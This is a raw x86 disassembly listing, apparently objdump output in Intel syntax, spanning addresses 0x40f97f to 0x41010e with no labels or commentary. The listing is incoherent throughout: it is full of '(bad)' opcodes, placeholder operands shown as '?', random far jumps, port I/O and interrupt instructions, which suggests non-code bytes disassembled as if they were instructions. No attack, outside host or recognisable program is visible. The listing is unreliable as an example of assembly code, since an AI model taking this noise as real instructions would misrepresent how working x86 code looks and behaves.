  40f97f:	mov    ebx,0x6166efe
  40f984:	mov    esp,ecx
  40f986:	scas   eax,DWORD PTR es:[edi]
  40f987:	das    
  40f988:	pushf  
  40f989:	in     al,dx
  40f98a:	std    
  40f98b:	add    DWORD PTR [eax],ebp
  40f98d:	pop    ecx
  40f98e:	scas   al,BYTE PTR es:[edi]
  40f98f:	jae    0x40f9e2
  40f991:	in     al,0xe7
  40f993:	cld    
  40f994:	xor    BYTE PTR [ecx],0x88
  40f997:	outs   dx,BYTE PTR ds:[esi]
  40f998:	(bad)  [ebx]
  40f99a:	lods   eax,DWORD PTR ds:[esi]
  40f99b:	cmp    edx,edx
  40f99d:	ret    0xf6b9
  40f9a0:	sbb    eax,0x70453bb9
  40f9a5:	adc    esi,DWORD PTR ds:0x316b0406
  40f9ab:	ins    BYTE PTR es:[edi],dx
  40f9ac:	js     0x40f9d4
  40f9ae:	pmulhw mm7,QWORD PTR [edx-0x52ec85b6]
  40f9b5:	loop   0x40f9d5
  40f9b7:	push   esi
  40f9b8:	ret    0xcbb1
  40f9bb:	xsha256 (bad)
  40f9bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9bd:	push   esi
  40f9be:	ins    DWORD PTR es:[edi],dx
  40f9bf:	mov    ebp,0xae3948d7
  40f9c4:	sbb    eax,0xd89d47fc
  40f9c9:	out    dx,eax
  40f9ca:	sub    DWORD PTR [ecx],0x1303f7af
  40f9d0:	mov    dh,0xb7
  40f9d2:	test   DWORD PTR [edx-0x7944e873],eax
  40f9d8:	imul   ecx
  40f9da:	pop    ss
  40f9db:	mov    ?,ebx
  40f9dd:	jno    0x40f9ec
  40f9df:	cli    
  40f9e0:	fisub  DWORD PTR [eax-0x668869f1]
  40f9e6:	inc    edx
  40f9e7:	adc    ecx,edx
  40f9e9:	js     0x40fa17
  40f9eb:	fisubr DWORD PTR [ecx+0x78c3d23b]
  40f9f1:	stc    
  40f9f2:	or     DWORD PTR [eax-0x74],ebp
  40f9f5:	inc    esi
  40f9f6:	ds push ss
  40f9f8:	mov    al,0xc
  40f9fa:	push   ebp
  40f9fb:	mov    al,ds:0xe0b2697d
  40fa00:	das    
  40fa01:	ins    BYTE PTR es:[edi],dx
  40fa02:	retf   
  40fa03:	aaa    
  40fa04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa05:	pop    esp
  40fa06:	fisub  WORD PTR [edx]
  40fa08:	jb     0x40f9a8
  40fa0a:	ret    
  40fa0b:	int3   
  40fa0c:	pop    ecx
  40fa0d:	or     dh,ah
  40fa0f:	push   edx
  40fa10:	inc    edx
  40fa11:	jo     0x40f9ca
  40fa13:	jo     0x40fa44
  40fa15:	sbb    al,0xb6
  40fa17:	ins    BYTE PTR es:[edi],dx
  40fa18:	or     dh,dh
  40fa1a:	js     0x40fa38
  40fa1c:	xchg   ebp,eax
  40fa1d:	inc    esp
  40fa1e:	std    
  40fa1f:	mov    cl,0x5d
  40fa21:	scas   eax,DWORD PTR es:[edi]
  40fa22:	aad    0x89
  40fa24:	(bad)  
  40fa25:	enter  0x74e9,0xef
  40fa29:	adc    edx,ecx
  40fa2b:	aad    0x2e
  40fa2d:	sbb    edx,DWORD PTR [ebx-0x4064d967]
  40fa33:	dec    ebp
  40fa34:	sub    al,0xfd
  40fa36:	lods   eax,DWORD PTR ds:[esi]
  40fa37:	push   edx
  40fa38:	dec    DWORD PTR [ecx-0x64c1981a]
  40fa3e:	xor    bh,BYTE PTR [eax+0x3a968f4d]
  40fa44:	inc    edx
  40fa45:	ret    
  40fa46:	(bad)  
  40fa47:	sub    edi,DWORD PTR [esi-0x13]
  40fa4a:	lock outs dx,DWORD PTR ds:[esi]
  40fa4c:	das    
  40fa4d:	fs es pop ds
  40fa50:	jmp    esi
  40fa52:	lds    esi,FWORD PTR [ebp-0x1a]
  40fa55:	adc    eax,0xd2de9929
  40fa5a:	sub    esi,ebp
  40fa5c:	mov    al,0xbf
  40fa5e:	ins    BYTE PTR es:[edi],dx
  40fa5f:	ret    
  40fa60:	sbb    ah,dl
  40fa62:	cmp    esp,DWORD PTR [edi-0xc]
  40fa65:	mov    cl,0x79
  40fa67:	js     0x40faa4
  40fa69:	mov    eax,ds:0x3e26c2c
  40fa6e:	xlat   BYTE PTR ds:[ebx]
  40fa6f:	daa    
  40fa70:	jp     0x40fabf
  40fa72:	sti    
  40fa73:	xchg   esi,eax
  40fa74:	(bad)  
  40fa75:	and    DWORD PTR [ebx+0x25366573],esi
  40fa7b:	mov    WORD PTR [ecx+0x34ddb72],gs
  40fa81:	int    0x20
  40fa83:	adc    ebp,esi
  40fa85:	jo     0x40fa94
  40fa87:	js     0x40fa1a
  40fa89:	ret    0xaae2
  40fa8c:	cmp    esi,ebp
  40fa8e:	pop    edx
  40fa8f:	outs   dx,DWORD PTR ds:[esi]
  40fa90:	xlat   BYTE PTR ds:[ebx]
  40fa91:	mov    bh,0xdf
  40fa93:	mov    ?,WORD PTR [ebx+0x33e0a57b]
  40fa99:	ret    0xd0a6
  40fa9c:	xor    DWORD PTR [edx+ebp*1+0x2b5fd637],ecx
  40faa3:	mov    ebx,0x2b3b7d31
  40faa8:	inc    edi
  40faa9:	xor    DWORD PTR [ecx-0x3d],esi
  40faac:	loop   0x40fa7a
  40faae:	dec    ebp
  40faaf:	jnp    0x40fafe
  40fab1:	push   ebp
  40fab2:	mov    dl,0x1d
  40fab4:	ret    
  40fab5:	out    dx,eax
  40fab6:	adc    al,0xf8
  40fab8:	fisub  WORD PTR [esi-0x56a07e6b]
  40fabe:	add    DWORD PTR [eax-0x38af7799],0x6d538259
  40fac8:	or     ebx,DWORD PTR [ebx+0x3e04b9ec]
  40face:	add    BYTE PTR [esi],ah
  40fad0:	(bad)  [ebp-0x56]
  40fad3:	adc    eax,0x72ddb7a2
  40fad8:	or     ebp,DWORD PTR [ebx]
  40fada:	pop    edx
  40fadb:	adc    ebx,0x3c9b2f8f
  40fae1:	xor    DWORD PTR [eax+edi*1-0x37],esp
  40fae5:	sbb    ah,bh
  40fae7:	test   al,0x6d
  40fae9:	pop    ebx
  40faea:	ds add eax,0xc5da899f
  40faf0:	xchg   edx,eax
  40faf1:	lods   eax,DWORD PTR ds:[esi]
  40faf2:	or     eax,0x8a5a8cc6
  40faf7:	mov    esi,0x86a95e2f
  40fafc:	adc    ebx,DWORD PTR [esi]
  40fafe:	fwait
  40faff:	dec    edi
  40fb00:	ins    DWORD PTR es:[edi],dx
  40fb01:	push   0xf4979cd7
  40fb06:	push   0x38f93fb9
  40fb0b:	cli    
  40fb0c:	mov    esp,DWORD PTR [ecx+0x7f]
  40fb0f:	test   BYTE PTR [esi-0x37],0xac
  40fb13:	fadd   QWORD PTR [eax+0x7bd57570]
  40fb19:	int3   
  40fb1a:	jns    0x40fb6e
  40fb1c:	call   0x1f72b2d1
  40fb21:	jmp    DWORD PTR [esp+eax*2]
  40fb24:	test   BYTE PTR [eax-0x5eda4b81],bl
  40fb2a:	sub    al,0x2e
  40fb2c:	xor    DWORD PTR [ebx+0x147d9ee8],ebx
  40fb32:	imul   ebx,DWORD PTR [ebp-0x6f],0xaec00923
  40fb39:	mov    ebx,0x5072731a
  40fb3e:	sbb    ch,0x74
  40fb41:	inc    ebp
  40fb42:	stos   BYTE PTR es:[edi],al
  40fb43:	pop    es
  40fb44:	adc    esi,edx
  40fb46:	fimul  DWORD PTR ds:0x4df88b47
  40fb4c:	jo     0x40fb11
  40fb4e:	or     DWORD PTR [ecx-0x7a],edx
  40fb51:	loopne 0x40fb3f
  40fb53:	retf   
  40fb54:	sbb    DWORD PTR [edi],ecx
  40fb56:	adc    BYTE PTR [eax],cl
  40fb58:	pop    DWORD PTR [edx-0x612cfbe5]
  40fb5e:	leave  
  40fb5f:	fimul  WORD PTR [esi-0x23]
  40fb62:	mov    bl,0x57
  40fb64:	mov    ah,0xa3
  40fb66:	mov    ds:0xc2168223,al
  40fb6b:	adc    eax,DWORD PTR [ebp-0x9]
  40fb6e:	into   
  40fb6f:	jns    0x40fb5f
  40fb71:	sub    eax,0x95d80b4a
  40fb76:	stc    
  40fb77:	and    eax,0xad0fa11b
  40fb7c:	mov    cs,WORD PTR [esi+0x7d4745b7]
  40fb82:	leave  
  40fb83:	xchg   ecx,eax
  40fb84:	popf   
  40fb85:	mov    ax,0x2ad9
  40fb89:	xor    eax,0x7b257e7f
  40fb8e:	repz shl BYTE PTR [eax-0x20fc1554],1
  40fb95:	jmp    0x40fc13
  40fb97:	and    al,BYTE PTR [ebx]
  40fb99:	lea    esi,[ecx+ebx*4+0x7015b50a]
  40fba0:	lock int 0x47
  40fba3:	daa    
  40fba4:	xlat   BYTE PTR ds:[ebx]
  40fba5:	jg     0x40fc11
  40fba7:	int3   
  40fba8:	retf   0x5bb2
  40fbab:	mov    eax,ds:0xde4cdcc3
  40fbb0:	dec    edi
  40fbb1:	cmp    ebx,esp
  40fbb3:	mov    edx,0xb4e2567b
  40fbb8:	fcom   DWORD PTR [esi]
  40fbba:	std    
  40fbbb:	enter  0x6ba0,0x8d
  40fbbf:	inc    ebp
  40fbc0:	push   esp
  40fbc1:	ins    BYTE PTR es:[edi],dx
  40fbc2:	dec    edi
  40fbc3:	or     BYTE PTR [edi+0x75ec37e4],0x82
  40fbca:	outs   dx,BYTE PTR ds:[esi]
  40fbcb:	sub    ebx,DWORD PTR [ecx-0x4d702964]
  40fbd1:	xchg   ebx,eax
  40fbd2:	fwait
  40fbd3:	and    DWORD PTR [esi+0x67994d0a],ebp
  40fbd9:	fdivr  QWORD PTR [ebx]
  40fbdb:	test   BYTE PTR [esi],0x84
  40fbde:	add    esi,DWORD PTR [esi-0x5280075a]
  40fbe4:	mov    DWORD PTR [ebx-0x1ca44df2],edx
  40fbea:	cmp    bh,BYTE PTR [edx]
  40fbec:	pop    es
  40fbed:	fstp   QWORD PTR [esi]
  40fbef:	xchg   edx,eax
  40fbf0:	sbb    esi,edi
  40fbf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbf3:	test   eax,0xa642d7a1
  40fbf8:	jns    0x40fb91
  40fbfa:	loop   0x40fba1
  40fbfc:	das    
  40fbfd:	pop    ebp
  40fbfe:	dec    eax
  40fbff:	sbb    cl,ch
  40fc01:	dec    ebx
  40fc02:	mov    ch,BYTE PTR [edi]
  40fc04:	inc    ebx
  40fc05:	mov    cl,0x80
  40fc07:	bound  edi,QWORD PTR [esi]
  40fc09:	mov    ebx,0xe5efaebd
  40fc0e:	and    al,0x64
  40fc10:	arpl   WORD PTR [ebx],si
  40fc12:	mov    dl,bh
  40fc14:	jb     0x40fc7e
  40fc16:	ret    
  40fc17:	in     eax,0xfb
  40fc19:	ds imul edx,ebx,0x766e22c2
  40fc20:	adc    dl,BYTE PTR [esi-0x79]
  40fc23:	mov    BYTE PTR [ebp-0x26],al
  40fc26:	mov    eax,0xf57df468
  40fc2b:	mov    WORD PTR [esi+0x4a63a3d8],?
  40fc31:	adc    bh,BYTE PTR ds:0x833019b0
  40fc37:	mov    fs,WORD PTR [ebx-0x1eab7d51]
  40fc3d:	enter  0xc54e,0xdb
  40fc41:	pop    esi
  40fc42:	je     0x40fc3e
  40fc44:	call   0x6262:0x257d27af
  40fc4b:	fadd   DWORD PTR [edx+0x62]
  40fc4e:	cmp    ebx,DWORD PTR [ebp-0x14]
  40fc51:	test   BYTE PTR [ecx-0x42725252],bh
  40fc57:	cs pushf 
  40fc59:	xor    bh,BYTE PTR [ebx+0x65dbfb04]
  40fc5f:	and    esi,DWORD PTR [ecx]
  40fc61:	and    BYTE PTR [esi-0x2b00d958],ch
  40fc67:	dec    eax
  40fc68:	jb     0x7c7d221b
  40fc6e:	push   ebp
  40fc6f:	outs   dx,DWORD PTR ds:[esi]
  40fc70:	add    al,0x86
  40fc72:	cmp    eax,0xfd814ab5
  40fc77:	aad    0x9
  40fc79:	clc    
  40fc7a:	mov    bl,0x30
  40fc7c:	rcr    BYTE PTR [esi-0x7a],1
  40fc7f:	call   0x4e71:0x1e3f9e66
  40fc86:	repz pop ds
  40fc88:	xor    DWORD PTR [esi+0x38],edx
  40fc8b:	test   DWORD PTR [ebx-0x59],edx
  40fc8e:	mov    al,ds:0xbd3a9777
  40fc93:	adc    esi,DWORD PTR [edx+0x71]
  40fc96:	cmp    al,0xcf
  40fc98:	inc    esi
  40fc99:	not    BYTE PTR [ebp-0x640dee4]
  40fc9f:	or     ecx,esi
  40fca1:	inc    ebp
  40fca2:	mov    esp,DWORD PTR [edx-0x1c]
  40fca5:	mov    WORD PTR [esi+esi*8-0x73b33ee5],ss
  40fcac:	jnp    0x40fc69
  40fcae:	sar    dh,cl
  40fcb0:	jnp    0x40fc6d
  40fcb2:	mov    bl,0x72
  40fcb4:	dec    esp
  40fcb5:	je     0x40fc8d
  40fcb7:	jns    0x40fceb
  40fcb9:	mov    ds:0x953eff5f,eax
  40fcbe:	jnp    0x40fd3c
  40fcc0:	pop    ecx
  40fcc1:	fdivr  QWORD PTR [esp+edx*8+0x4]
  40fcc5:	int3   
  40fcc6:	sub    ecx,DWORD PTR [ecx-0x73b0fdd5]
  40fccc:	cmp    al,0x5d
  40fcce:	sub    al,0x2b
  40fcd0:	pusha  
  40fcd1:	cld    
  40fcd2:	inc    ecx
  40fcd3:	ins    DWORD PTR es:[edi],dx
  40fcd4:	xchg   BYTE PTR [bp+si-0x75],cl
  40fcd8:	mov    edx,0x2b0cf100
  40fcdd:	or     al,0xd9
  40fcdf:	aaa    
  40fce0:	push   esi
  40fce1:	mov    ds:0x68f15591,eax
  40fce6:	xor    bh,BYTE PTR [eax-0x45096353]
  40fcec:	and    al,0xa
  40fcee:	and    bh,BYTE PTR [edi+edi*2+0x5c30cf5b]
  40fcf5:	(bad)  
  40fcf6:	adc    cl,BYTE PTR [ecx+0x28]
  40fcf9:	sbb    al,0x3b
  40fcfb:	sub    dl,BYTE PTR [esi+0x44]
  40fcfe:	lods   al,BYTE PTR ds:[esi]
  40fcff:	mov    ds:0xc46fb902,eax
  40fd04:	out    0x57,eax
  40fd06:	mov    eax,DWORD PTR [edx]
  40fd08:	and    DWORD PTR ds:0x4a1f3a50,eax
  40fd0e:	sbb    DWORD PTR [edi+0x11],edx
  40fd11:	push   0xa71772da
  40fd16:	int3   
  40fd17:	out    dx,eax
  40fd18:	or     BYTE PTR ds:0x6843f40b,al
  40fd1e:	aaa    
  40fd1f:	sbb    bh,cl
  40fd21:	ja     0x40fd62
  40fd23:	and    BYTE PTR [ebx-0x5b],bh
  40fd26:	dec    eax
  40fd27:	scas   al,BYTE PTR es:[edi]
  40fd28:	add    BYTE PTR [eax+0x58abf8fa],dh
  40fd2e:	leave  
  40fd2f:	jb     0x40fd36
  40fd31:	mov    al,ds:0xd180188f
  40fd36:	test   DWORD PTR [ecx+eiz*2],0x5ccfb7b8
  40fd3d:	out    dx,al
  40fd3e:	int    0x3e
  40fd40:	pop    esp
  40fd41:	xchg   esp,eax
  40fd42:	mov    dh,BYTE PTR [eax+0x6822d293]
  40fd48:	sbb    BYTE PTR ds:0xd802964a,0x23
  40fd4f:	or     eax,0xb4938306
  40fd54:	xor    BYTE PTR [ebx-0x2c],bl
  40fd57:	mov    ds:0x7bf4e8b,eax
  40fd5c:	sub    bl,BYTE PTR [eax]
  40fd5e:	ret    
  40fd5f:	jns    0x40fd8f
  40fd61:	pop    eax
  40fd62:	sbb    al,0x48
  40fd64:	leave  
  40fd65:	aad    0x5a
  40fd67:	ins    BYTE PTR es:[edi],dx
  40fd68:	push   edi
  40fd69:	sub    BYTE PTR [eax],al
  40fd6b:	sub    BYTE PTR [ecx-0x7059231],ch
  40fd71:	mov    DWORD PTR [esi],esp
  40fd73:	xchg   edx,eax
  40fd74:	es pop edx
  40fd76:	jno    0x40fdae
  40fd78:	and    ebx,DWORD PTR [esi+edi*1+0x40b7aacc]
  40fd7f:	cmp    BYTE PTR [ebp+0x307fcfcf],dh
  40fd85:	test   eax,0x76678f93
  40fd8a:	jae    0x40fdb3
  40fd8c:	shl    BYTE PTR [eax-0x5faeb995],cl
  40fd92:	xor    eax,0x5e334470
  40fd97:	(bad)  [ecx+0x7ac2ea02]
  40fd9d:	sbb    DWORD PTR [eax-0x35e3a11b],ebp
  40fda3:	(bad)  
  40fda4:	repnz cmp BYTE PTR [ebx-0x115bb30d],bh
  40fdab:	int    0x8
  40fdad:	or     DWORD PTR [ebx],ebx
  40fdaf:	jbe    0x40fda5
  40fdb1:	fimul  DWORD PTR [edx-0x2bc5163e]
  40fdb7:	fisttp WORD PTR [esi+edi*2]
  40fdba:	pop    es
  40fdbb:	cmp    bh,BYTE PTR ds:0xe54c1525
  40fdc1:	pushf  
  40fdc2:	daa    
  40fdc3:	nop
  40fdc4:	cmp    bl,bl
  40fdc6:	mov    ebx,0xf50462bf
  40fdcb:	mov    ch,0xb3
  40fdcd:	sub    BYTE PTR [edi],0x6a
  40fdd0:	js     0x40fdda
  40fdd2:	xchg   ecx,eax
  40fdd3:	js     0x40fdb7
  40fdd5:	sub    ebx,esi
  40fdd7:	repnz pop ds
  40fdd9:	push   esp
  40fdda:	or     ecx,esi
  40fddc:	sbb    dh,dl
  40fdde:	add    al,0xb3
  40fde0:	loope  0x40fe10
  40fde2:	pushf  
  40fde3:	repnz mov dl,0x6f
  40fde6:	cmp    esp,DWORD PTR [edx]
  40fde8:	ins    DWORD PTR es:[edi],dx
  40fde9:	mov    ds:0x95e5b21e,al
  40fdee:	sbb    ecx,DWORD PTR [edx]
  40fdf0:	dec    edi
  40fdf1:	dec    eax
  40fdf2:	mul    BYTE PTR [edx]
  40fdf4:	cld    
  40fdf5:	icebp  
  40fdf6:	imul   BYTE PTR [edx+eiz*4]
  40fdf9:	lods   eax,DWORD PTR ds:[esi]
  40fdfa:	push   cs
  40fdfb:	sub    al,0x23
  40fdfd:	mov    ds:0x4a2c808f,al
  40fe02:	mov    eax,ds:0xdff06d41
  40fe07:	ins    DWORD PTR es:[edi],dx
  40fe08:	and    al,0x14
  40fe0a:	pop    ecx
  40fe0b:	sub    BYTE PTR [edx],dh
  40fe0d:	lahf   
  40fe0e:	dec    ebp
  40fe0f:	fcomp  st(7)
  40fe11:	sbb    ecx,DWORD PTR [ecx+0x5ce4d9f3]
  40fe17:	sbb    ecx,DWORD PTR [edi-0x5fb09105]
  40fe1d:	push   0xbd1df8f0
  40fe22:	icebp  
  40fe23:	fmulp  st(2),st
  40fe25:	addr16 std 
  40fe27:	test   al,bl
  40fe29:	sahf   
  40fe2a:	adc    eax,0x8335c3a
  40fe2f:	es xchg edi,eax
  40fe31:	mov    al,0x2a
  40fe33:	pop    esp
  40fe34:	lahf   
  40fe35:	mov    ch,0xbc
  40fe37:	cmp    BYTE PTR [ecx+0x13],al
  40fe3a:	jmp    0x706a:0xa91c40ff
  40fe41:	mov    edi,0xd255337
  40fe46:	pop    es
  40fe47:	icebp  
  40fe48:	sub    BYTE PTR [ecx],dl
  40fe4a:	fmul   st(0),st
  40fe4c:	dec    esi
  40fe4d:	(bad)  
  40fe4f:	popf   
  40fe50:	jae    0x40fdd4
  40fe52:	popa   
  40fe53:	ins    BYTE PTR es:[edi],dx
  40fe54:	test   eax,0x8e3875d9
  40fe59:	push   ds
  40fe5a:	repnz addr16 seto ch
  40fe5f:	and    BYTE PTR [edx+0x726a8b3a],ch
  40fe65:	and    eax,0xa94d4287
  40fe6a:	and    BYTE PTR [ebp-0x7cafe94b],dl
  40fe70:	mov    dl,0x31
  40fe72:	jnp    0x40fe95
  40fe74:	sar    bl,0x79
  40fe77:	sti    
  40fe78:	pop    ebp
  40fe79:	or     BYTE PTR [edi+0xd527048],ah
  40fe7f:	or     DWORD PTR [eax],ebx
  40fe81:	fdivr  DWORD PTR [ebp-0x4a]
  40fe84:	out    0x4f,al
  40fe86:	jns    0x40fe5d
  40fe88:	xchg   BYTE PTR [esi+0x24],dl
  40fe8b:	fwait
  40fe8c:	mov    eax,0x107cf12a
  40fe91:	repz xchg ebx,eax
  40fe93:	adc    eax,0x2352a337
  40fe98:	loope  0x40feb7
  40fe9a:	popf   
  40fe9b:	mov    dh,0xbd
  40fe9d:	fcom   DWORD PTR [eax+0xb]
  40fea0:	(bad)  
  40fea1:	(bad)  
  40fea2:	mov    cl,0xc6
  40fea4:	arpl   dx,sp
  40fea6:	push   ebx
  40fea7:	addr16 fyl2xp1 
  40feab:	pop    edi
  40feac:	les    esi,FWORD PTR [ebx-0x18]
  40feaf:	lods   eax,DWORD PTR ds:[esi]
  40feb0:	call   0x7e5c62e1
  40feb5:	mov    bl,0x57
  40feb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feb8:	sbb    eax,0x77a0f397
  40febd:	cs stos DWORD PTR es:[edi],eax
  40febf:	inc    edi
  40fec0:	mov    BYTE PTR [ecx-0x5],dl
  40fec3:	xor    al,0x9a
  40fec5:	outs   dx,BYTE PTR gs:[esi]
  40fec7:	mov    al,0x6e
  40fec9:	mov    edi,0x7f68ac94
  40fece:	ret    
  40fecf:	out    0x47,eax
  40fed1:	retf   
  40fed2:	idiv   BYTE PTR [ecx]
  40fed4:	lods   eax,DWORD PTR ds:[esi]
  40fed5:	leave  
  40fed6:	cli    
  40fed7:	xchg   ecx,eax
  40fed8:	and    dh,BYTE PTR [eax*4-0x242056ac]
  40fedf:	add    DWORD PTR ds:0x671789ed,0xd098a6cf
  40fee9:	or     ebp,DWORD PTR [eax-0x54]
  40feec:	dec    esi
  40feed:	sub    al,0x9e
  40feef:	ds stc 
  40fef1:	pop    ecx
  40fef2:	and    eax,0xa2aa502a
  40fef7:	je     0x40ff67
  40fef9:	jmp    0xcba2:0x5917ee41
  40ff00:	(bad)  
  40ff01:	addr16 stc 
  40ff03:	das    
  40ff04:	inc    ecx
  40ff05:	inc    eax
  40ff06:	stc    
  40ff07:	push   DWORD PTR [edx+0x35]
  40ff0a:	lds    esi,FWORD PTR [ebx-0x55842032]
  40ff10:	aad    0x42
  40ff12:	cs sti 
  40ff14:	vminss xmm3,xmm1,DWORD PTR [eax]
  40ff18:	adc    ebx,DWORD PTR [edi+0x585c0f3f]
  40ff1e:	xchg   ecx,eax
  40ff1f:	sbb    al,0x66
  40ff21:	(bad)  
  40ff23:	adc    DWORD PTR [ecx-0x44],ecx
  40ff26:	imul   ebx,ebx,0x5e
  40ff29:	pop    esp
  40ff2a:	shr    esp,0x24
  40ff2d:	or     DWORD PTR fs:[eax+0x70],ecx
  40ff31:	add    al,0xd5
  40ff33:	adc    eax,0xa4692873
  40ff38:	xabort 0x16
  40ff3b:	outs   dx,DWORD PTR ds:[esi]
  40ff3c:	mov    eax,0x61106688
  40ff41:	retf   
  40ff42:	dec    esi
  40ff43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff44:	leave  
  40ff45:	mov    dh,0xc7
  40ff47:	sub    dh,BYTE PTR [ebx+edx*4+0xe59d0e9]
  40ff4e:	or     DWORD PTR [ebx+eax*1-0x1835f11],esp
  40ff55:	pop    esi
  40ff56:	push   eax
  40ff57:	jmp    0x40fef3
  40ff59:	sub    al,0xc9
  40ff5b:	mov    ebp,0x99b588d5
  40ff60:	dec    ecx
  40ff61:	test   DWORD PTR [ebx-0x7eb68d52],0x584fe8a2
  40ff6b:	and    DWORD PTR [edi+eiz*1-0x12],eax
  40ff6f:	and    al,0x20
  40ff71:	(bad)  
  40ff72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff73:	ret    
  40ff74:	and    ebx,eax
  40ff76:	xor    eax,0xde2330df
  40ff7b:	pop    esp
  40ff7c:	inc    edi
  40ff7d:	cmp    bl,ah
  40ff7f:	and    DWORD PTR [ecx],0xde4817a2
  40ff85:	idiv   BYTE PTR [ebp+esi*2-0xf]
  40ff89:	div    DWORD PTR [edx-0x12449ac8]
  40ff8f:	cs inc eax
  40ff91:	mov    WORD PTR [eax+0x1b5647c8],?
  40ff97:	jmp    0x201148f
  40ff9c:	sub    DWORD PTR [ebx+0x30],edx
  40ff9f:	pop    ds
  40ffa0:	retf   0x3c4e
  40ffa3:	mov    edi,0x7990ba97
  40ffa8:	fst    QWORD PTR [edx+ebp*2]
  40ffab:	mov    eax,0x26372cfc
  40ffb0:	retf   0x12c1
  40ffb3:	and    bl,al
  40ffb5:	add    DWORD PTR [ebx],edi
  40ffb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffb8:	xchg   ebx,eax
  40ffb9:	test   ebx,0x1d53fbaa
  40ffbf:	inc    edi
  40ffc0:	fidiv  DWORD PTR [ebx+edx*2-0x5]
  40ffc4:	add    al,BYTE PTR [ecx+ebp*1]
  40ffc7:	in     eax,0x32
  40ffc9:	add    DWORD PTR [eiz*2-0x7cb45cd4],ebx
  40ffd0:	xchg   esi,eax
  40ffd1:	mov    WORD PTR [esi],ss
  40ffd3:	fs loopne 0x40ffef
  40ffd6:	pop    esp
  40ffd7:	hlt    
  40ffd8:	xchg   DWORD PTR [edx+0x0],eax
  40ffdb:	hlt    
  40ffdc:	push   es
  40ffdd:	pop    eax
  40ffde:	test   BYTE PTR [edx-0x57],0x4f
  40ffe2:	(bad)  
  40ffe3:	gs daa 
  40ffe5:	sbb    BYTE PTR [ebx+0x7401d064],bh
  40ffeb:	xchg   edx,eax
  40ffec:	daa    
  40ffed:	or     DWORD PTR [esi],esi
  40ffef:	xor    ecx,ebp
  40fff1:	test   al,0xdc
  40fff3:	into   
  40fff4:	mov    DWORD PTR [ecx+0x12],ebx
  40fff7:	mov    edx,0xb7ebf817
  40fffc:	call   0xc694cb9f
  410001:	pusha  
  410002:	jg     0x41006f
  410004:	add    BYTE PTR [eax+0x3b497bf3],bl
  41000a:	(bad)  
  41000b:	lock and ecx,DWORD PTR [eax-0x5]
  41000f:	dec    ebp
  410010:	scas   al,BYTE PTR es:[edi]
  410011:	sbb    bl,BYTE PTR [ecx]
  410013:	and    eax,0x755a4b52
  410018:	aas    
  410019:	push   ecx
  41001a:	mov    ebx,0xa2c58aea
  41001f:	(bad)  
  410020:	ss push ebx
  410022:	xchg   esi,eax
  410023:	jmp    0x410082
  410025:	mov    WORD PTR [ecx+eiz*8],es
  410028:	sbb    al,0xd3
  41002a:	jp     0x40ffc6
  41002c:	inc    esi
  41002d:	cmp    eax,0x5b983db6
  410032:	dec    esi
  410033:	fldcw  WORD PTR [ecx+0xe]
  410036:	lds    esi,FWORD PTR [esi]
  410038:	mov    esi,0x52b6b18
  41003d:	nop
  41003e:	arpl   WORD PTR [edi+0x66],ax
  410041:	and    al,0xb2
  410043:	pop    ss
  410044:	push   ebp
  410045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410046:	mov    ebp,0x2c338c0c
  41004b:	mov    WORD PTR [ebp-0x6c],fs
  41004e:	icebp  
  41004f:	xor    eax,0xe4d10f51
  410054:	push   0x6c
  410056:	mov    al,0xaf
  410058:	daa    
  410059:	(bad)  
  41005b:	fadd   QWORD PTR [esi-0x7]
  41005e:	out    0xfc,al
  410060:	sub    eax,0x41bf8aaa
  410065:	sub    BYTE PTR [eax],0x89
  410068:	pop    ds
  410069:	in     al,0x24
  41006b:	cmp    bl,BYTE PTR [eax+0x60]
  41006e:	pusha  
  41006f:	pop    ecx
  410070:	mov    BYTE PTR [edi+ebp*8-0x1bf1e213],bh
  410077:	add    ch,BYTE PTR [esi-0x22]
  41007a:	mov    esi,0x9bc26564
  41007f:	xor    al,BYTE PTR [ecx+0xc]
  410082:	push   ds
  410083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410084:	outs   dx,BYTE PTR ds:[esi]
  410085:	out    dx,eax
  410086:	and    dl,ah
  410088:	xchg   edi,eax
  410089:	lock in eax,0x9
  41008c:	jae    0x41001f
  41008e:	test   DWORD PTR [eax+0x82be909],esp
  410094:	adc    DWORD PTR [ebx],edi
  410096:	sbb    eax,0x22f23179
  41009b:	in     eax,0xb0
  41009d:	stos   BYTE PTR es:[edi],al
  41009e:	fwait
  41009f:	mov    eax,0x7ae860ed
  4100a4:	add    al,0x1a
  4100a6:	or     edx,DWORD PTR ss:[eax-0x4badc597]
  4100ad:	sub    BYTE PTR [edx+ebx*8],cl
  4100b0:	addr16 pop eax
  4100b2:	popf   
  4100b3:	mov    dh,0x77
  4100b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100b6:	add    esp,esp
  4100b8:	xchg   esi,eax
  4100b9:	mov    ebx,DWORD PTR [edi-0x26]
  4100bc:	imul   esp,esp,0x7a
  4100bf:	cmp    esi,esi
  4100c1:	out    dx,al
  4100c2:	xchg   ebp,eax
  4100c3:	inc    ebp
  4100c4:	(bad)  
  4100c5:	mov    dl,0x3
  4100c7:	outs   dx,BYTE PTR ds:[esi]
  4100c8:	xor    al,0xe9
  4100ca:	cmc    
  4100cb:	jbe    0x410132
  4100cd:	dec    ecx
  4100ce:	out    0x82,eax
  4100d0:	iret   
  4100d1:	out    0x6e,eax
  4100d3:	daa    
  4100d4:	xor    eax,edx
  4100d6:	movhps xmm7,QWORD PTR [eax-0x2d]
  4100da:	and    edx,DWORD PTR [ebx+0x76e95088]
  4100e0:	pop    ss
  4100e1:	int    0x8b
  4100e3:	xor    eax,0xb5430237
  4100e8:	push   edi
  4100e9:	and    edx,DWORD PTR [edx-0x21354658]
  4100ef:	add    al,al
  4100f1:	pop    edi
  4100f2:	int    0x65
  4100f4:	aad    0xa7
  4100f6:	imul   ebx,DWORD PTR [ecx-0x70058abb],0x6f711b4a
  410100:	mov    al,ds:0x5c789113
  410105:	xor    edi,edx
  410107:	icebp  
  410108:	cmp    eax,0x93091e11
  41010d:	inc    edi
  41010e:	or     BYTE PTR [ecx-0x21],al
